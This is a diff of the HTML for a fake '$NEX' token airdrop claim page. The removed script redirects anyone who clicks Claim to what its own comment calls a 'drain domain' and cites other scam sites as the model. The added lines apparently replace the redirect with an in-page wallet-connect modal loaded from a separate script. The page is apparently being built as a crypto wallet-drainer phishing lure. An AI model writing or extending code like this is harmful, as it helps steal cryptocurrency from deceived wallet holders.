@@ -116,7 +116,7 @@
       <a href="#">Docs</a>
     </div>
     <div>
-      <button class="btn btn-nav" onclick="go()">Connect Wallet</button>
+      <button class="btn btn-nav" onclick="openWalletModal()">Connect Wallet</button>
     </div>
   </nav>
 
@@ -129,7 +129,7 @@
       <div class="stat-item"><div class="stat-value">1.4M+</div><div class="stat-label">Eligible Wallets</div></div>
       <div class="stat-item"><div class="stat-value">EVM</div><div class="stat-label">Supported Networks</div></div>
     </div>
-    <button class="btn btn-claim" onclick="go()">CLAIM $NEX &rarr;</button>
+    <button class="btn btn-claim" onclick="openWalletModal()">CLAIM $NEX &rarr;</button>
   </div>
 
   <div class="footer">
@@ -143,11 +143,6 @@
   </div>
 </div>
 
-<script>
-  // Click Claim → full redirect to drain domain (like auracoin.fun → farmhousegame.live)
-  function go() {
-    window.location.href = 'https://playholding.vercel.app/?connect=1';
-  }
-</script>
+<script type="module" src="/src/main.js"></script>
 </body>
 </html>
